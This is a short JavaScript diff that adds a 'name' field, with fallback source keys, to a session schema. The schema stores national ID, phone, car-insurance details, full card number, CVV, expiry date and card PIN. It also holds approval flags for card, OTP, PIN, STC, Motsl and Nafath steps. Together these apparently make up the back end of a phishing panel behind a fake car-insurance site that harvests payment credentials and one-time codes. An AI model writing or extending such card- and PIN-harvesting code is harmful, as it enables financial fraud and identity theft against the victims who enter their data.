@@ -152,8 +152,7 @@ const SESSION_STATUSES = new Set([
 ]);
 
 const SESSION_FIELDS = [
-  "national_id", "phone", "serialNumber", "car_year", "car_model", "carPrice",
-  "carHolderName", "purpose_of_use", "tameenFor", "tameenAllType", "tameenType",
+  "name", "national_id", "phone", "serialNumber", "car_year", "car_model", "carPrice", "carHolderName", "purpose_of_use", "tameenFor", "tameenAllType", "tameenType",
   "startedDate", "companyData", "cardNumber", "cvv", "expiryDate", "card_name", "pin",
   "cardAttempts", "CardAccept", "OtpCardAccept", "PinAccept", "STCAccept", "MotslAccept",
   "MotslOtpAccept", "NavazAccept", "stcAwaitingCall", "blocked", "checked", "MotslPhone",
@@ -186,6 +185,7 @@ function canonicalSession(id, row, timestamp) {
   const source = row || {};
   const document = {};
   for (const field of SESSION_FIELDS) document[field] = source[field] ?? null;
+  document.name = document.name ?? source.documentOwnerName ?? source.fullName ?? null;
   document.national_id = document.national_id ?? source.idNumber ?? source.identityNumber ?? null;
   document.phone = document.phone ?? source.mobileNumber ?? source.phoneNumber ?? null;
   document.serialNumber = document.serialNumber ?? source.sequenceNumber ?? null;
